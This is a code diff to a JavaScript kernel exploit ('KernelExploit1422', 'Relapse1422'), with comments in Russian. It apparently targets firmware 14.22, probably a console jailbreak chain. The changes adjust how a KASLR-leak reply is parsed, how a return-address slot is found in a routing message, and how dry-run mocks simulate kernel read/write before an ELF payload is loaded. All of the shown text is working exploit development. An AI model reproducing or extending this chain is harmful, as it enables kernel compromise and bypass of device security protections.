@@ -495,14 +495,23 @@ class KernelExploit1422 {
 		if (this.chain && typeof this.chain.rtmsg2 === "function") {
 			const reply = await this.chain.rtmsg2();
 			if (!reply) return null;
-			return this.copyIntoProcess(reply);
+			// Виды ответа: {ptr, bytes} от моста, готовый буфер, указатель.
+			// new Uint8Array({ptr,bytes}) даёт 0 байт — поэтому сначала toBytes().
+			const bytes = KernelExploit1422.toBytes(reply) || KernelExploit1422.toBytes(reply && reply.bytes);
+			if (bytes) return this.copyIntoProcess(bytes);
+			return this.copyIntoProcess(reply);          // указатель/иное — старый путь
 		}
-		if (this.options.rtmsgReply) return this.copyIntoProcess(this.options.rtmsgReply);
+		if (this.options.rtmsgReply) {
+			const b = KernelExploit1422.toBytes(this.options.rtmsgReply) || this.options.rtmsgReply;
+			return this.copyIntoProcess(b);
+		}
 		this.degraded("chain.rtmsg2 отсутствует; KASLR-ответ можно передать через options.rtmsgReply");
 		return null;
 	}
 	copyIntoProcess(bytes) {
-		const src = bytes instanceof Uint8Array ? bytes : new Uint8Array(bytes);
+		const src = KernelExploit1422.toBytes(bytes);
+		if (!src) return bytes;              // {ptr,bytes} / указатель оставляем как есть
+	
 		const buf = this.alloc(src.length + 16);
 		for (let i = 0; i < src.length; i++) this.writeU8(buf, i, src[i]);
 		this.replyLen = src.length;
@@ -546,10 +555,11 @@ class KernelExploit1422 {
 	findAuthorRecord(replyPtr) {
 		// sockaddr_rtmsg2author лежит в конце сообщения; ищем маркер rtm_type==RTM_GET(4)
 		// и отдаём начало записи. Дополнительно допускаем позицию len-RET_SLOT-16.
-		for (let i = 0; i + 8 < this.replyLen; i += 4) {
+		const rl = this.replyLen || 512;
+		for (let i = 0; i + 8 < rl; i += 4) {
 			if (this.readU8(replyPtr, i) === 0x04 && this.readU8(replyPtr, i + 1) === 0x00) return i;
 		}
-		return this.replyLen > RET_SLOT + 8 ? this.replyLen - RET_SLOT - 16 : null;
+		return rl > RET_SLOT + 8 ? rl - RET_SLOT - 16 : null;
 	}
 
 	// --------------------------------------------- STAGE 2: affinity
@@ -1201,7 +1211,7 @@ if (typeof window !== "undefined") {
 // а не падает, когда офсеты 14.22 отсутствуют (oid → DEGRADED → fallback на waiter-вектор).
 const NODE = typeof process !== "undefined" && !!(process.versions && process.versions.node);
 
-function makeDryRunMocks(badKernel, noOid, full) {
+function makeDryRunMocks(badKernel, noOid, full, objReply) {
 	const MEM = 0x80000, KERNEL_HI = 0xffffffff;
 	const mem = new Uint8Array(MEM);
 	const kw = new Map();
@@ -1248,6 +1258,7 @@ function makeDryRunMocks(badKernel, noOid, full) {
 			const ret = 0x00B06869, at = 184;
 			for (let i=0;i<4;i++) buf[at+i] = (ret >>> (i*8)) & 0xff;
 			for (let i=0;i<4;i++) buf[at+4+i] = 0xff;                      // ret.hi = 0xffffffff
+			if (objReply) return { ptr: ptr(0x1000), bytes: buf };         // чистый объект моста
 			return buf;
 		},
 		add_syscall() {}, add_syscall_ret() {},
@@ -1325,8 +1336,8 @@ function makeDryRunMocks(badKernel, noOid, full) {
 	return { p, chain, rw };
 }
 
-async function dryRunCli(badKernel, noOid, full) {
-	const { p, chain, rw } = makeDryRunMocks(!!badKernel, !!noOid, !!full);
+async function dryRunCli(badKernel, noOid, full, objReply) {
+	const { p, chain, rw } = makeDryRunMocks(!!badKernel, !!noOid, !!full || !!objReply, !!objReply);
 	// payload: реальный ELF из tools/payload/payloads (или --payload <path>)
 	// payload ищем и относительно CWD, и относительно самого модуля (иначе результат
 	// зависит от того, из какого каталога запущен CLI).
@@ -1362,7 +1373,7 @@ async function dryRunCli(badKernel, noOid, full) {
 		return;
 	}
 	const krw = globalThis.window.KRW;
-	console.log(`=== Relapse1422 DRY-RUN${badKernel ? " · KASLR-FAIL" : ""}${noOid ? " · NO-OID" : ""}${full ? " · FULL (p.ready, pipe-R/W)" : ""} (моки, консоль не нужна) ===`);
+	console.log(`=== Relapse1422 DRY-RUN${badKernel ? " · KASLR-FAIL" : ""}${noOid ? " · NO-OID" : ""}${full ? " · FULL (p.ready, pipe-R/W)" : ""}${objReply ? " · OBJ-REPLY {ptr,bytes}" : ""} (моки, консоль не нужна) ===`);
 	console.log(`firmware: ${krw.firmware} (сборка ${krw.built})`);
 	console.log(`константы: kernelData=0x${krw.kernelData.toString(16)} allproc=0x${krw.allproc.toString(16)} ` +
 		`security_flags=0x${krw.securityFlags.toString(16)} rootvnode=0x${krw.rootvnode.toString(16)}`);
@@ -1405,6 +1416,6 @@ async function dryRunCli(badKernel, noOid, full) {
 if (NODE && process.argv[1] && process.argv.some((a) => a.startsWith("--dry-run"))) {
 	const { pathToFileURL } = await import("node:url");
 	if (import.meta.url === pathToFileURL(process.argv[1]).href) {
-		await dryRunCli(process.argv.includes("--dry-run-kaslr-fail"), process.argv.includes("--dry-run-no-oid"), process.argv.includes("--dry-run-full"));
+		await dryRunCli(process.argv.includes("--dry-run-kaslr-fail"), process.argv.includes("--dry-run-no-oid"), process.argv.includes("--dry-run-full"), process.argv.includes("--dry-run-objreply"));
 	}
 }
